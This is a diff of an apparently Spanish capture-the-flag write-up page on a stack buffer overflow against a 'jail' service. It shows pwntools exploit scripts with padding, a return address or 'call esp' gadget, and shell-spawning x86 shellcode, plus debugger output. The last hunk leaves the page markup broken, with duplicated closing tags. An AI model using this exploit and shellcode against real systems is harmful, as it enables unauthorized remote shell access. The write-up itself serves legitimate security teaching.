@@ -312,10 +312,10 @@ Thread 2.1 "jail" received signal SIGSEGV, Segmentation fault.
 offset </span><span class="o">= </span><span class="mi">28</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-ret </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">
-stack </span><span class="o">= </span><span class="no">b</span><span class="s">"C" </span><span class="o">* </span><span class="mi">16</span><span class="p">
-
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret </span><span class="o">+ </span><span class="p">stack
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 16</span><span class="p">
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"127.0.0.1"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
@@ -355,7 +355,7 @@ Program received signal SIGSEGV, Segmentation fault.
 <p class="plain-text">Enviamos <code class="language-plaintext highlighter-rouge">28 A's</code> de basura y <code class="language-plaintext highlighter-rouge">4 B's</code> para sobreescribir el puntero por lo que la direccion donde inician las <code class="language-plaintext highlighter-rouge">C's</code> deberia estar <code class="language-plaintext highlighter-rouge">32</code> bytes mas adelante del leak</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">p/x 0xffffcf30 + 32
-$1 = 0xffffcf50
+</span><span class="az">$1</span><span class="p"> = 0xffffcf50
 </span><span class="ro">pwndbg> </span><span class="p">x/4wx 0xffffcf50
 </span><span class="az">0xffffcf50</span><span class="p">:     0x43434343      0x43434343      0x43434343      0x43434343  
 </span><span class="ro">pwndbg></span>
@@ -371,7 +371,7 @@ $1 = 0xffffcf50
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">p/x 0xffffd610 + 32  
-$2 = 0xffffd630
+</span><span class="az">$2</span><span class="p"> = 0xffffd630
 </span><span class="ro">pwndbg></span>
 </code></pre></div></div><br>
 
@@ -452,11 +452,12 @@ _start</span><span class="p">:
 offset </span><span class="o">= </span><span class="mi">28</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-addr </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0xffffd630</span><span class="p">)
-
 shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"  </span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">addr </span><span class="o">+ </span><span class="p">shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0xffffd630</span><span class="p">)</span><span class="c1"> # address</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.34"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
@@ -497,11 +498,12 @@ JMP Instructions
 offset </span><span class="o">= </span><span class="mi">28</span><span class="p">
 junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
 
-callesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x0804910f</span><span class="p">)
-
 shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"  </span><span class="p">
 
-payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">callesp </span><span class="o">+ </span><span class="p">shellcode
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804910f</span><span class="p">)</span><span class="c1"> # call esp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> shellcode
 
 shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.34"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
@@ -821,6 +823,13 @@ c87**************************806
   </footer><br><br>
 
 <script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
+
+/script>
 <script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
 
     </div>
